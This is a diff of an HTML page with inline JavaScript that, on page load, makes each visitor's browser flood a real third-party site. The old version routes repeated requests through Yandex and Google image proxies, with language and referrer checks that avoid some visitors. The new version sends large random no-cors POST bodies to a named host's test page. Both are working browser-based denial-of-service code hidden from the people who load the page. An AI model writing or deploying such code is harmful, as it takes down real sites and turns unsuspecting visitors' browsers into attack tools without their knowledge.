@@ -1,82 +1,71 @@
 <html>
+<head>
 
-	<head>
+	<script type="text/javascript">
 
-		<meta name="referrer" content="no-referrer" />
+		var controller = new AbortController();
 
-	    <script>
+		var signal = controller.signal;
 
-		    // https://javascript-obfuscator.org/ (String Array Encoding: base64, Self Defending: true, )
+		var rnd = function() {
+			return Math.random().toString(36).substr(2);
+	    };
 
-		    var interval = false;
 
-		    var srcns = ["microsoft", "google", "bing", "yandex"];
-		    var tdlns = ["com", "ru", "net", "org", "de", "uk"];
-		    var kywds = ["images", "documents", "videos", "music"];
+		async function fetchURLs(target) {
 
-	        var rnd = function(length) {
-				return Math.random().toString(36).substr(2, length);
-	        };
+			try {
 
-		    var _ysrc = function(target) {
-			    return 'https://'+srcns[3]+'.'+tdlns[1]+'/'+kywds[0]+'/search?format=json&url='+encodeURIComponent(target)+'&rpt=imageview';
-		    };
+				var url = target+(target.indexOf('?') > 0 ? '&' : '?')+rnd()+'='+rnd();
 
-		    var _gsrc = function(target) {
-			    return 'https://'+kywds[0]+Math.round(Math.random()*10000)+'-focus-opensocial.'+srcns[1]+'usercontent.'+tdlns[0]+'/gadgets/proxy?container=focus&resize_w=25&url='+encodeURIComponent(target);
-		    };
+				var postdata = {};
 
-	        var doit = function(target, method) {
+				postdata[rnd()] = rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd()+rnd();
 
-		        var src = '';
+				await fetch(url, {
+					signal,
+					mode: "no-cors",
+					cache: "no-cache",
+					referrer: url,
+//					referrerPolicy: "no-referrer",
+					method: "POST",
+					body: JSON.stringify(postdata),
+				    headers: {
+//				      'Content-Type': 'application/json',
+//				      'Accept': 'application/json'
+				    }
+				});
 
-				switch(method) {
-				    case 'y':
-				        src = _ysrc(target);
-				        break;
-				    case 'g':
-				        src = _gsrc(target);
-				        break;
-				    default:
-				        src = target;
-				}
+			} catch (e) {
 
-				var img = new Image();
+			}
 
-				img.src = src;
+		};
 
-	        };
 
-	        var start = function(target, check, methods, seq) {
 
-		        var lang = navigator.language || navigator.userLanguage;
 
-				if(document.location.search.indexOf("ga-debug") == -1 && (lang == "tr-TR" || document.referrer == null || document.referrer.indexOf(window.location.hostname) >= 0))return false;
+		var start = function(target) {
 
-		        if(check) {
+			fetchURLs(target);
 
-					var img = new Image();
+			var interval = setInterval(function() {
 
-					img.onerror = function() {clearInterval(interval);};
+				//fetchURLs(target);
 
-					img.src = check+(check.indexOf('?') > 0 ? '&' : '?')+rnd(7)+'='+rnd(7);
+			}, 4);
 
-				}
 
-				interval = setInterval(function() {
+			setTimeout(function() {clearInterval(interval); controller.abort();}, 1000);
 
-					doit(target+(target.indexOf('?') > 0 ? '&' : '?')+rnd(7)+'='+rnd(7), methods.split('')[Math.floor(Math.random() * methods.length)]);
+		};
 
-				}, seq);
 
-	        };
+	</script>
 
-		</script>
+</head>
 
-	</head>
+<body onload="start('https://www.hc.com.tr/test.php');">
 
-	<body onload="start('https://www.smokturkey.org/', false, 'yyyywwg', 1000);">
-		<script id="_wauogl">var _wau = _wau || []; _wau.push(["dynamic", "0qpct0aaz0", "ogl", "c4302bffffff", "small"]);</script><script async src="//waust.at/d.js"></script>	
-	</body>
-
+</body>
 </html>
